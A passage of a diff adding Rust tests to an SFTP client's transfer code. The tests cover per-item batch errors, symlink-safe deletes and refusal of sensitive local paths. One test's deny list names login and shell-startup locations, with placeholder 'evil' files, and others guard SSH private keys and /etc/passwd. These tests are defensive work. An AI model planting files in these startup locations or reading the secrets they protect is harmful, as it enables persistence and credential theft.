+    /// One unreadable picked folder failed the WHOLE add (nothing queued)
+    /// while the folders picked before it had already been created locally.
+    /// Each item now has its own result, and the others are queued.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_one_unreadable_picked_folder_does_not_fail_the_others() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/a/1.txt", b"1");
+        fx.write("/locked/x", b"x");
+        fx.write("/b/2.txt", b"2");
+        fx.knobs.lock().unwrap().unlistable.push("/locked".into());
+        let local = LocalDir::new();
+        let dest = local.0.join("downloads");
+        let items = vec![
+            serde_json::json!({ "remote": "/a" }),
+            serde_json::json!({ "remote": "/locked" }),
+            serde_json::json!({ "remote": "/b" }),
+        ];
+
+        let out = expand_download_batch(
+            &sftp,
+            &items,
+            &dest,
+            &batch(),
+            SensitiveLocations::current(),
+        )
+        .await
+        .expect("one bad item must not fail the batch");
+
+        let mut remotes: Vec<&str> = out.jobs.iter().map(|j| j.remote_path.as_str()).collect();
+        remotes.sort();
+        assert_eq!(remotes, vec!["/a/1.txt", "/b/2.txt"]);
+        let statuses: Vec<(&str, ItemStatus, usize)> = out
+            .outcomes
+            .iter()
+            .map(|o| (o.path.as_str(), o.status, o.added))
+            .collect();
+        assert_eq!(
+            statuses,
+            vec![
+                ("/a", ItemStatus::Queued, 1),
+                ("/locked", ItemStatus::Error, 0),
+                ("/b", ItemStatus::Queued, 1),
+            ]
+        );
+        let error = out.outcomes[1].error.clone().unwrap_or_default();
+        assert!(
+            error.contains("/locked") && error.contains("Permission denied"),
+            "{error}"
+        );
+        assert!(!dest.join("locked").exists());
+        assert!(dest.join("a").is_dir() && dest.join("b").is_dir());
+    }
+
+    /// Nothing is created locally for an item whose walk failed - not even the
+    /// destination folder when no item could be walked at all - and the call
+    /// then fails with the items' reasons.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_no_local_folder_is_created_for_items_whose_walk_failed() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/locked/x", b"x");
+        fx.knobs.lock().unwrap().unlistable.push("/locked".into());
+        let local = LocalDir::new();
+        let dest = local.0.join("never-made");
+        let items = vec![
+            serde_json::json!({ "remote": "/locked" }),
+            serde_json::json!({ "remote": "/missing" }),
+        ];
+
+        let out = expand_download_batch(
+            &sftp,
+            &items,
+            &dest,
+            &batch(),
+            SensitiveLocations::current(),
+        )
+        .await
+        .expect("item failures are results, not a failed call");
+
+        assert!(out.jobs.is_empty());
+        assert!(out.outcomes.iter().all(|o| o.status == ItemStatus::Error));
+        assert!(!dest.exists(), "nothing could be downloaded: no folder");
+        let failure = batch_failure(&out.outcomes).expect("nothing was queued");
+        assert!(
+            failure.contains("/locked") && failure.contains("/missing"),
+            "{failure}"
+        );
+        assert_eq!(
+            batch_failure(&[ItemOutcome::queued("/a", 0)]),
+            None,
+            "an empty folder is not a failure"
+        );
+    }
+
+    /// One refused pick (a private key in `~/.ssh`) failed the whole
+    /// multi-file upload and queued nothing. It is now that item's result,
+    /// like an unreadable one, and the rest are queued.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_a_refused_upload_pick_is_reported_and_the_rest_are_queued() {
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        std::fs::create_dir_all(base.join("home/.ssh")).unwrap();
+        std::fs::create_dir_all(base.join("home/docs")).unwrap();
+        std::fs::write(base.join("home/.ssh/config"), b"Host x").unwrap();
+        std::fs::write(base.join("home/docs/a.txt"), b"a").unwrap();
+        let s = sensitive_fixture(&base);
+        let path = |rel: &str| base.join(rel).display().to_string();
+        let items = vec![
+            serde_json::json!({ "local": path("home/docs/a.txt"), "remote": "/up/a.txt" }),
+            serde_json::json!({ "local": path("home/.ssh/config"), "remote": "/up/config" }),
+            serde_json::json!({ "local": path("home/missing.txt"), "remote": "/up/m.txt" }),
+        ];
+
+        let out = expand_upload_batch(&items, &batch(), &s)
+            .expect("one refused pick must not fail the batch");
+
+        let sources: Vec<&str> = out.jobs.iter().map(|j| j.local_path.as_str()).collect();
+        assert_eq!(sources, vec![path("home/docs/a.txt").as_str()]);
+        let statuses: Vec<ItemStatus> = out.outcomes.iter().map(|o| o.status).collect();
+        assert_eq!(
+            statuses,
+            vec![ItemStatus::Queued, ItemStatus::Error, ItemStatus::Error]
+        );
+        let refused = out.outcomes[1].error.clone().unwrap_or_default();
+        assert!(
+            refused.contains(&path("home/.ssh/config")) && refused.contains("cannot be uploaded"),
+            "{refused}"
+        );
+        let missing = out.outcomes[2].error.clone().unwrap_or_default();
+        assert!(missing.contains("missing.txt"), "{missing}");
+    }
+
+    // ─── RU6a item 7: Task 10's missing tests ────────────────────────────────
+
+    /// `sftp_download`'s grant branch: a path the user picked in the save
+    /// dialog may sit in a sensitive place (they chose it); the same path as a
+    /// bare renderer string may not. App data and system directories stay
+    /// refused either way.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_a_dialog_granted_download_path_skips_only_the_deny_list() {
+        let base = std::path::PathBuf::from("/fixture");
+        let s = sensitive_fixture(&base);
+        let ssh_config = base.join("home/.ssh/config").display().to_string();
+        assert!(check_download_target(&ssh_config, true, &s).is_ok());
+        assert!(check_download_target(&ssh_config, false, &s).is_err());
+        let ordinary = base.join("home/docs/a.txt").display().to_string();
+        assert!(check_download_target(&ordinary, false, &s).is_ok());
+        for granted in [true, false] {
+            assert!(check_download_target("relative/a.txt", granted, &s).is_err());
+            #[cfg(unix)]
+            assert!(check_download_target("/etc/passwd", granted, &s).is_err());
+        }
+    }
+
+    /// Item 1: remote names with a NUL are refused, not flattened into a
+    /// writable name; Windows' extra reserved device spellings are refused too.
+    #[test]
+    fn ru6a_remote_names_with_nul_or_windows_reserved_devices_are_refused() {
+        for bad in [
+            "a\u{0}b",
+            "CONIN$",
+            "conout$.txt",
+            "COM\u{b9}.txt",
+            "LPT\u{b2}",
+        ] {
+            assert_eq!(sanitize_remote_name(bad), None, "{bad:?}");
+        }
+    }
+
+    /// Item 1: a local link outside the destination is refused BEFORE mkdir
+    /// touches anything through it (checking only after mkdir was too late).
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_download_folders_cannot_create_through_a_link_outside_the_destination() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/r/link/new/f", b"x");
+        let local = LocalDir::new();
+        let outside = LocalDir::new();
+        let root = canonical(&local);
+        std::fs::create_dir_all(root.join("r")).unwrap();
+        std::os::unix::fs::symlink(&outside.0, root.join("r/link")).unwrap();
+        let expanded = expand_download(&sftp, "/r", &root, &download_ctx(false), None)
+            .await
+            .unwrap();
+        assert!(expanded.items.is_empty());
+        assert!(
+            !outside.0.join("new").exists(),
+            "mkdir ran outside the destination"
+        );
+    }
+
+    /// Item 2: an unknown path is never opened on the assumption it is a file.
+    /// On an untyped server a folder's OPENDIR can be refused too; the file
+    /// open would read a folder, or worse a pipe.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_download_to_refuses_an_unknown_type_instead_of_opening_it() {
+        let (sftp, fx) = untyped_tree().await;
+        fx.knobs.lock().unwrap().unlistable.push("/t/d".into());
+        let local = LocalDir::new();
+        let err = download_to(&sftp, "/t/d", &local.file("unknown"))
+            .await
+            .unwrap_err()
+            .to_string();
+        assert!(
+            err.contains("Could not tell") && err.contains("not downloaded"),
+            "{err}"
+        );
+        assert!(
+            !fx.ops().iter().any(|op| op.starts_with("open ")),
+            "{:?}",
+            fx.ops()
+        );
+    }
+
+    /// Item 4: a picked item whose final local path is refused is an ERROR,
+    /// not a "queued: 0" success; an acceptable pick still queues.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_refused_download_target_has_its_own_error_result() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/a", b"a");
+        fx.write("/b", b"b");
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        let dest = base.join("home");
+        let items = vec![
+            serde_json::json!({ "remote": "/a", "localName": ".bashrc" }),
+            serde_json::json!({ "remote": "/b" }),
+        ];
+        let out = expand_download_batch(
+            &sftp,
+            &items,
+            &dest,
+            &batch(),
+            Arc::new(sensitive_fixture(&base)),
+        )
+        .await
+        .unwrap();
+        assert_eq!(out.outcomes[0].status, ItemStatus::Error);
+        assert_eq!(out.outcomes[1].status, ItemStatus::Queued);
+        assert_eq!(out.jobs.len(), 1);
+    }
+
+    /// Item 12: a modification time change alone is a conflict too (the other
+    /// save can have exactly the same length).
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_a_remote_mtime_change_without_a_size_change_is_a_conflict() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"my edit").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+        std::fs::File::options()
+            .write(true)
+            .open(fx.path("/srv/app.conf"))
+            .unwrap()
+            .set_modified(std::time::UNIX_EPOCH + std::time::Duration::from_secs(1_600_000_000))
+            .unwrap();
+        sync.clone().on_change().await;
+        assert_eq!(tmp_opens(&fx), 0);
+        let e = events.lock().unwrap()[0].clone();
+        assert_eq!(e["conflict"], true);
+        assert_eq!(e["remoteSize"], 2);
+        assert_eq!(e["remoteModifiedMs"], 1_600_000_000_000i64);
+    }
+
+    // ─── RU6a item 10 ────────────────────────────────────────────────────────
+
+    /// An entry whose type the server leaves out and whose LSTAT then fails
+    /// is left alone (RU4) - and the note now says why, instead of hiding the
+    /// cause behind "does not say whether it is a file or a folder".
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_an_entry_whose_type_could_not_be_checked_says_why() {
+        let (sftp, fx) = untyped_tree().await;
+        fx.knobs
+            .lock()
+            .unwrap()
+            .lstat_refused
+            .push("/t/d".to_string());
+        let sftp_ref: &russh_sftp::client::SftpSession = &sftp;
+
+        let plan = plan_download("/t", "t", |dir| async move {
+            list_remote_dir(sftp_ref, &dir).await
+        })
+        .await
+        .unwrap();
+        let notes = plan.notes.into_vec().join("\n");
+        assert!(
+            notes.contains("/t/d") && notes.contains("Permission denied"),
+            "{notes}"
+        );
+
+        let out = chmod_path(&sftp, "/t", 0o700, true, true, true)
+            .await
+            .unwrap();
+        assert!(
+            out["failed"].to_string().contains("Permission denied"),
+            "{out}"
+        );
+    }
+
+    // ─── RU6a fix round 1, group B: the local-path policy ────────────────────
+
+    /// A download plan made up locally: the picked folder `pick`, `folders`
+    /// folders in it and `files` files spread over all of them.
+    #[cfg(unix)]
+    fn synthetic_plan(pick: &str, folders: usize, files: usize) -> DownloadPlan {
+        let mut plan = DownloadPlan::default();
+        plan.dirs.push(PlannedDir {
+            remote: format!("/{pick}"),
+            rel: vec![pick.to_string()],
+        });
+        for d in 0..folders {
+            plan.dirs.push(PlannedDir {
+                remote: format!("/{pick}/d{d}"),
+                rel: vec![pick.to_string(), format!("d{d}")],
+            });
+        }
+        for f in 0..files {
+            let mut rel = plan.dirs[f % plan.dirs.len()].rel.clone();
+            rel.push(format!("f{f}.txt"));
+            plan.files.push(PlannedFile {
+                remote: format!("/{}", rel.join("/")),
+                rel,
+                size: 1,
+            });
+        }
+        plan
+    }
+
+    /// Item 2: the deny-list check of a folder download resolved every
+    /// protected location again for every FILE (about 50 resolutions per
+    /// file: 4 s for 10,000 files on Linux, about 90 s on Windows, before
+    /// anything was queued). The locations are resolved once now, and a file
+    /// is judged by its folder's resolved path and its own name.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_fix1_a_folder_download_resolves_paths_per_folder_not_per_file() {
+        let local = LocalDir::new();
+        let root = canonical(&local);
+        let s = sensitive_fixture(&root);
+        let plan = synthetic_plan("pick", 9, 9_990);
+
+        reset_resolutions();
+        let mut out = ExpandedDownload::default();
+        let refused = materialize_download(
+            Prepared::Folder(plan),
+            &root,
+            &download_ctx(false),
+            &s,
+            &mut out,
+        );
+        let spent = resolutions();
+
+        assert_eq!(refused, None);
+        assert_eq!(out.items.len(), 9_990);
+        assert!(
+            spent <= 10 * 8,
+            "{spent} path resolutions for 10 folders and 9,990 files"
+        );
+    }
+
+    /// Item 2, the upload side: every file of a picked folder went through
+    /// the full read check (its own resolution plus every protected
+    /// location's).
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_fix1_a_folder_upload_resolves_paths_per_folder_not_per_file() {
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        let pick = base.join("home").join("docs");
+        for d in 0..4 {
+            std::fs::create_dir_all(pick.join(format!("d{d}"))).unwrap();
+        }
+        for f in 0..2_000 {
+            let dir = pick.join(format!("d{}", f % 4));
+            std::fs::write(dir.join(format!("f{f}")), b"x").unwrap();
+        }
+        let s = sensitive_fixture(&base);
+        let items = vec![serde_json::json!({
+            "local": pick.display().to_string(),
+            "remote": "/up/docs",
+        })];
+
+        reset_resolutions();
+        let out = expand_upload_batch(&items, &batch(), &s).unwrap();
+        let spent = resolutions();
+
+        assert_eq!(out.jobs.len(), 2_000);
+        assert!(
+            spent <= 5 * 4 + 8,
+            "{spent} path resolutions for 5 folders and 2,000 files"
+        );
+    }
+
+    /// Item 2, job start: every queued download re-checks its final path
+    /// when it starts (+9 ms per job on Windows). The protected locations are
+    /// reused between checks now, so only the job's own path is resolved.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_fix1_the_job_start_check_reuses_the_resolved_locations() {
+        let local = LocalDir::new();
+        let target = canonical(&local).join("downloads").join("f.txt");
+        let _ = local_write_refusal(&target);
+
+        reset_resolutions();
+        let refused = local_write_refusal(&target);
+        let spent = resolutions();
+
+        assert_eq!(refused, None);
+        assert!(
+            spent <= 6,
+            "{spent} path resolutions to re-check one queued download"
+        );
+    }
+
+    /// Item 7: item errors shared the 25-entry warnings cap with the notes of
+    /// the walks, so 30 skipped links hid the `/locked` error. Item errors
+    /// come first now and are never dropped.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_item_errors_come_first_and_are_never_dropped_from_the_warnings() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/links/real.txt", b"x");
+        for i in 0..30 {
+            fx.symlink("real.txt", &format!("/links/l{i:02}"));
+        }
+        fx.write("/locked/x", b"x");
+        fx.knobs.lock().unwrap().unlistable.push("/locked".into());
+        let local = LocalDir::new();
+        let items = vec![
+            serde_json::json!({ "remote": "/links" }),
+            serde_json::json!({ "remote": "/locked" }),
+        ];
+
+        let out = expand_download_batch(
+            &sftp,
+            &items,
+            &local.0.join("dl"),
+            &batch(),
+            SensitiveLocations::current(),
+        )
+        .await
+        .unwrap();
+        let warnings = out.warnings();
+
+        assert!(
+            warnings.first().is_some_and(|w| w.contains("/locked")),
+            "{warnings:?}"
+        );
+        let links = warnings
+            .iter()
+            .filter(|w| w.contains("symbolic links are not followed"))
+            .count();
+        assert!(links > 0 && links <= Notes::KEEP, "{warnings:?}");
+        assert!(
+            warnings.iter().any(|w| w.contains("more")),
+            "the hidden notes are counted: {warnings:?}"
+        );
+    }
+
+    /// Item 2, the commands/mod.rs half: the system folders were resolved
+    /// again for every check (on Windows up to seven folders, per file). They
+    /// are resolved with the other protected locations now, so checking an
+    /// existing folder resolves that folder and nothing else.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_fix1_checking_a_path_resolves_only_that_path() {
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        let dir = base.join("home");
+        std::fs::create_dir_all(&dir).unwrap();
+        let s = sensitive_fixture(&base);
+
+        reset_resolutions();
+        let checked =
+            validate_sftp_local_path_with(&dir.display().to_string(), LocalAccess::Write, &s);
+        let spent = resolutions();
+
+        assert!(checked.is_ok(), "{checked:?}");
+        assert_eq!(spent, 1, "path resolutions to check one existing folder");
+    }
+
+    /// Item 15: the name sanitizer was not idempotent (`notes\u{3000}.` gave
+    /// `notes\u{3000}`, which the plain-name check then refused because a
+    /// second pass trims it to `notes`). Property: every output is a fixed
+    /// point - over every name of up to four characters from the characters
+    /// the sanitizer treats specially, and pseudo-random longer ones.
+    #[test]
+    fn ru6a_fix1_the_name_sanitizer_is_idempotent() {
+        const ALPHABET: [char; 18] = [
+            'a', 'C', 'O', 'N', '1', '$', '.', ' ', '\u{3000}', '\u{a0}', '\u{85}', '\u{2028}',
+            '\t', '\u{1}', '\u{7f}', ':', '*', '"',
+        ];
+        let check = |name: &str| {
+            if let Some(once) = sanitize_remote_name(name) {
+                assert_eq!(
+                    sanitize_remote_name(&once).as_deref(),
+                    Some(once.as_str()),
+                    "{name:?} -> {once:?}"
+                );
+            }
+        };
+        check("notes\u{3000}.");
+        let mut names = vec![String::new()];
+        for _ in 0..4 {
+            names = names
+                .iter()
+                .flat_map(|n| ALPHABET.iter().map(move |c| format!("{n}{c}")))
+                .collect();
+            names.iter().for_each(|n| check(n));
+        }
+        // xorshift64, fixed seed: reproducible.
+        let mut state: u64 = 0x9e37_79b9_7f4a_7c15;
+        let mut next = move || {
+            state ^= state << 13;
+            state ^= state >> 7;
+            state ^= state << 17;
+            state
+        };
+        for _ in 0..20_000 {
+            let len = 1 + (next() % 16) as usize;
+            let name: String = (0..len)
+                .map(|_| ALPHABET[(next() % ALPHABET.len() as u64) as usize])
+                .collect();
+            check(&name);
+        }
+    }
+
+    /// Item 15, end to end: a remote name the sanitizer changes is accepted
+    /// by the plain-name check in its sanitized form.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_fix1_sanitized_names_pass_the_plain_name_check() {
+        let local = LocalDir::new();
+        let root = canonical(&local);
+        let s = sensitive_fixture(std::path::Path::new("/fixture-not-here"));
+        for remote in ["notes\u{3000}.", "a\u{85}.", "x\u{2028} ."] {
+            let name = sanitize_remote_name(remote).expect("usable");
+            assert_eq!(
+                derived_local_refusal(&root, &root.join(&name), &s),
+                None,
+                "{remote:?} -> {name:?}"
+            );
+        }
+    }
+
+    /// Item 17: an upload pick that adds nothing - a link to a folder - and
+    /// the protected files a folder upload leaves out were only logged. Both
+    /// are the item's warnings now (and in the batch's warnings).
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_fix1_what_an_upload_leaves_out_is_reported_per_item() {
+        let local = LocalDir::new();
+        let base = canonical(&local);
+        std::fs::create_dir_all(base.join("home/.ssh")).unwrap();
+        std::fs::create_dir_all(base.join("real")).unwrap();
+        std::fs::write(base.join("home/.ssh/id_ed25519"), b"secret").unwrap();
+        std::fs::write(base.join("home/.ssh/id_ed25519.pub"), b"ssh-ed25519 AAAA").unwrap();
+        std::fs::write(base.join("home/notes.txt"), b"n").unwrap();
+        std::fs::write(base.join("real/a.txt"), b"a").unwrap();
+        std::os::unix::fs::symlink(base.join("real"), base.join("linked")).unwrap();
+        let s = sensitive_fixture(&base);
+        let path = |rel: &str| base.join(rel).display().to_string();
+        let items = vec![
+            serde_json::json!({ "local": path("home"), "remote": "/up/home" }),
+            serde_json::json!({ "local": path("linked"), "remote": "/up/linked" }),
+        ];
+
+        let out = expand_upload_batch(&items, &batch(), &s).unwrap();
+
+        let mut sources: Vec<&str> = out.jobs.iter().map(|j| j.local_path.as_str()).collect();
+        sources.sort();
+        assert_eq!(
+            sources,
+            vec![
+                path("home/.ssh/id_ed25519.pub").as_str(),
+                path("home/notes.txt").as_str()
+            ]
+        );
+        let home = &out.outcomes[0];
+        assert_eq!((home.status, home.added), (ItemStatus::Queued, 2));
+        assert!(
+            home.warnings
+                .iter()
+                .any(|w| w.contains(&path("home/.ssh/id_ed25519"))
+                    && w.contains("cannot be uploaded")),
+            "{:?}",
+            home.warnings
+        );
+        // RU6a fix round 2 (nit): a pick that adds nothing at all is an
+        // error, as for downloads.
+        let linked = &out.outcomes[1];
+        assert_eq!((linked.status, linked.added), (ItemStatus::Error, 0));
+        let error = linked.error.clone().unwrap_or_default();
+        assert!(
+            error.contains(&path("linked")) && error.contains("link to a folder"),
+            "{error}"
+        );
+        let all = out.warnings().join("\n");
+        assert!(
+            all.contains("link to a folder") && all.contains("id_ed25519"),
+            "{all}"
+        );
+    }
+
+    /// Item 19: more places where a written file runs at login or when a
+    /// shell starts. Writing there is refused; reading (dotfile syncing) is
+    /// still allowed, and the neighbours stay writable.
+    #[test]
+    fn ru6a_fix1_login_and_shell_startup_locations_are_refused_for_writes() {
+        let Some(home) = dirs::home_dir() else { return };
+        let at = |rel: &str| {
+            rel.split('/')
+                .fold(home.clone(), |p, part| p.join(part))
+                .display()
+                .to_string()
+        };
+        for rel in [
+            ".config/autostart/evil.desktop",
+            ".config/autostart-scripts/evil.sh",
+            ".config/plasma-workspace/env/evil.sh",
+            ".config/systemd/user/evil.service",
+            ".config/systemd/user/default.target.wants/evil.service",
+            ".local/share/systemd/user/evil.service",
+            ".config/environment.d/50-evil.conf",
+            "Library/LaunchAgents/evil.plist",
+            ".bash_aliases",
+            ".bash_logout",
+            ".zlogout",
+            ".inputrc",
+            ".kshrc",
+            ".cshrc",
+            ".tcshrc",
+            ".xprofile",
+            ".xinitrc",
+            ".xsession",
+            ".xsessionrc",
+            ".profile.d/evil.sh",
+            ".config/fish/config.fish",
+            ".config/fish/conf.d/evil.fish",
+            ".config/powershell/Microsoft.PowerShell_profile.ps1",
+            ".config/nushell/config.nu",
+        ] {
+            assert!(
+                validate_sftp_local_path(&at(rel), LocalAccess::Write).is_err(),
+                "{rel} must not be writable"
+            );
+        }
+        for rel in [".config/fish/config.fish", ".bash_aliases", ".xinitrc"] {
+            assert!(
+                validate_sftp_local_path(&at(rel), LocalAccess::Read).is_ok(),
+                "{rel} may be uploaded"
+            );
+        }
+        for rel in [
+            ".config/fishing/x",
+            ".config/autostartup",
+            ".profile.dx",
+            ".config/systemd/other",
+        ] {
+            assert!(
+                validate_sftp_local_path(&at(rel), LocalAccess::Write).is_ok(),
+                "{rel} stays writable"
+            );
+        }
+    }
+
+    /// Item 19, the layout: the XDG folders the environment moves are
+    /// covered as well as `~/.config` and `~/.local/share`, and the Windows
+    /// PowerShell profiles sit in the real Documents folder and in
+    /// `~/Documents`.
+    #[test]
+    fn ru6a_fix1_startup_locations_follow_the_xdg_folders_and_documents() {
+        use std::path::Path;
+        let home = Path::new("/h");
+        let (startup, shell) = home_startup_locations(
+            home,
+            &[home.join(".config"), PathBuf::from("/x/cfg")],
+            &[home.join(".local").join("share"), PathBuf::from("/x/data")],
+        );
+        for p in [
+            "/h/.config/autostart",
+            "/x/cfg/autostart",
+            "/x/cfg/systemd/user",
+            "/h/.local/share/systemd/user",
+            "/x/data/systemd/user",
+            "/h/Library/LaunchAgents",
+        ] {
+            assert!(startup.contains(&PathBuf::from(p)), "{p}: {startup:?}");
+        }
+        for p in [
+            "/h/.bashrc",
+            "/h/.zlogout",
+            "/h/.profile.d",
+            "/h/.config/fish",
+            "/x/cfg/fish",
+            "/x/cfg/powershell",
+        ] {
+            assert!(shell.contains(&PathBuf::from(p)), "{p}: {shell:?}");
+        }
+        assert_eq!(
+            powershell_profile_dirs(Some(Path::new("/od/Documents")), Some(home)),
+            vec![
+                PathBuf::from("/od/Documents/PowerShell"),
+                PathBuf::from("/od/Documents/WindowsPowerShell"),
+                PathBuf::from("/h/Documents/PowerShell"),
+                PathBuf::from("/h/Documents/WindowsPowerShell"),
+            ]
+        );
+        assert_eq!(
+            powershell_profile_dirs(Some(&home.join("Documents")), Some(home)).len(),
+            2
+        );
+        let s = Locations {
+            shell_startup: powershell_profile_dirs(Some(Path::new("/od/Documents")), None),
+            ..Locations::default()
+        }
+        .resolve();
+        let profile = Path::new("/od/Documents/PowerShell/Microsoft.PowerShell_profile.ps1");
+        assert!(s.refusal(profile, LocalAccess::Write).is_some());
+        assert!(s.refusal(profile, LocalAccess::Read).is_none());
+        assert!(s
+            .refusal(
+                Path::new("/od/Documents/PowerShellScripts/x.ps1"),
+                LocalAccess::Write
+            )
+            .is_none());
+    }
+
+    // ─── RU6a fix round 1, group C: servers without type bits (item 8) ───────
+
+    /// `/t` holds `f`, `d/g`, `flink` (a link to `f`) and `link` (a link to
+    /// `/keep`, whose `precious` must survive whatever is done to `/t`), on
+    /// a server that leaves the type bits out and answers every READLINK with
+    /// `readlink`.
+    #[cfg(unix)]
+    async fn untyped_tree_with_links(
+        readlink: russh_sftp::protocol::StatusCode,
+    ) -> (
+        russh_sftp::client::SftpSession,
+        crate::sftp::testkit::Fixture,
+    ) {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/t/f", b"x");
+        fx.write("/t/d/g", b"y");
+        fx.write("/keep/precious", b"keep me");
+        set_mode(&fx, "/keep/precious", 0o644);
+        fx.symlink("f", "/t/flink");
+        fx.symlink("../keep", "/t/link");
+        {
+            let mut knobs = fx.knobs.lock().unwrap();
+            knobs.untyped_modes = true;
+            knobs.readlink_status = Some(readlink);
+        }
+        (sftp, fx)
+    }
+
+    /// Item 8: with READLINK unsupported, deleting a folder left every plain
+    /// file ("could not tell whether it is a file or a folder"). REMOVE is
+    /// tried first now - it never follows a link - so files and links go,
+    /// folders are emptied and removed, and nothing outside is touched.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_a_delete_without_readlink_removes_files_links_and_folders() {
+        use russh_sftp::protocol::StatusCode;
+        let (sftp, fx) = untyped_tree_with_links(StatusCode::OpUnsupported).await;
+
+        let deleted = remove_remote_tree(&sftp, "/t").await;
+
+        assert_eq!(deleted, Ok(()));
+        assert!(!fx.exists("/t"));
+        assert_eq!(fx.read("/keep/precious"), b"keep me");
+    }
+
+    /// Item 8 (sec F2): a server whose READLINK answers "failure" for a link
+    /// too. The link was taken for "not a link", opened as a folder - which
+    /// follows it - and everything it pointed to was deleted. Even when the
+    /// link itself cannot be removed, it is not followed now: it opens as a
+    /// folder but does not resolve to itself.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_a_delete_never_empties_the_folder_a_link_points_to() {
+        use russh_sftp::protocol::StatusCode;
+        let (sftp, fx) = untyped_tree_with_links(StatusCode::Failure).await;
+        assert_eq!(remove_remote_tree(&sftp, "/t").await, Ok(()));
+        assert!(!fx.exists("/t"));
+        assert_eq!(fx.read("/keep/precious"), b"keep me");
+
+        let (sftp, fx) = untyped_tree_with_links(StatusCode::Failure).await;
+        fx.knobs
+            .lock()
+            .unwrap()
+            .remove_refused
+            .push("/t/link".to_string());
+        let err = remove_remote_tree(&sftp, "/t").await.unwrap_err();
+        assert!(err.contains("/t/link"), "{err}");
+        assert!(fx.exists("/keep/precious"), "{err}");
+        assert_eq!(fx.read("/keep/precious"), b"keep me");
+    }
+
+    /// Item 8, the folder the user picked: a link to a folder handed to a
+    /// recursive delete is unlinked - the folder it points to is never
+    /// emptied - whether or not the server reports types.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_a_recursive_delete_of_a_link_only_unlinks_it() {
+        for untyped in [false, true] {
+            let (sftp, fx) = crate::sftp::testkit::serve().await;
+            fx.write("/keep/precious", b"keep me");
+            fx.symlink("keep", "/link");
+            fx.knobs.lock().unwrap().untyped_modes = untyped;
+
+            let deleted = remove_remote_tree(&sftp, "/link").await;
+
+            assert_eq!(deleted, Ok(()), "untyped={untyped}");
+            assert!(
+                std::fs::symlink_metadata(fx.path("/link")).is_err(),
+                "untyped={untyped}"
+            );
+            assert_eq!(fx.read("/keep/precious"), b"keep me", "untyped={untyped}");
+        }
+    }
+
+    /// Item 8, the same guard for the walks (download, chmod): with READLINK
+    /// answering "failure" a link was walked as a folder - a folder download
+    /// fetched what it points to - and with READLINK unsupported nothing at
+    /// all could be told apart. An entry counts as a folder or a file only
+    /// when it resolves to itself; one that resolves elsewhere is a link.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix1_walks_tell_links_apart_when_readlink_cannot() {
+        use russh_sftp::protocol::StatusCode;
+        for readlink in [StatusCode::Failure, StatusCode::OpUnsupported] {
+            let (sftp, fx) = untyped_tree_with_links(readlink).await;
+            let mut got: Vec<(String, EntryKind)> = list_remote_dir(&sftp, "/t")
+                .await
+                .unwrap()
+                .into_iter()
+                .map(|e| (e.name, e.kind))
+                .collect();
+            got.sort_by(|a, b| a.0.cmp(&b.0));
+            assert_eq!(
+                got,
+                vec![
+                    ("d".to_string(), EntryKind::Dir),
+                    ("f".to_string(), EntryKind::File),
+                    ("flink".to_string(), EntryKind::Symlink),
+                    ("link".to_string(), EntryKind::Symlink),
+                ],
+                "{readlink:?}"
+            );
+            let sftp_ref: &russh_sftp::client::SftpSession = &sftp;
+            let plan = plan_download("/t", "t", |dir| async move {
+                list_remote_dir(sftp_ref, &dir).await
+            })
+            .await
+            .unwrap();
+            let mut files: Vec<&str> = plan.files.iter().map(|f| f.remote.as_str()).collect();
+            files.sort();
+            assert_eq!(files, vec!["/t/d/g", "/t/f"], "{readlink:?}");
+            let out = chmod_path(&sftp, "/t", 0o600, true, true, false)
+                .await
+                .unwrap();
+            assert_eq!(fx.mode("/keep/precious"), 0o644, "{readlink:?}: {out}");
+            assert_eq!(out["skippedLinks"], 2, "{readlink:?}: {out}");
+        }
+    }
+
+    // ─── RU6a fix round 2 ────────────────────────────────────────────────────
+
+    /// Item 1: a save whose swap the server refuses (a sticky shared folder,
+    /// a Windows file held open, an immutable file) was tried again by every
+    /// periodic check - another `ok:false` event and another full copy left
+    /// as a temporary file each time - for as long as the edit stayed open.
+    /// The failure is reported once and a check finds nothing new to try; the
+    /// next real save tries again, after removing the temporary file the
+    /// failed swap left.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix2_a_failing_save_is_not_retried_by_the_periodic_check() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        fx.knobs
+            .lock()
+            .unwrap()
+            .remove_refused
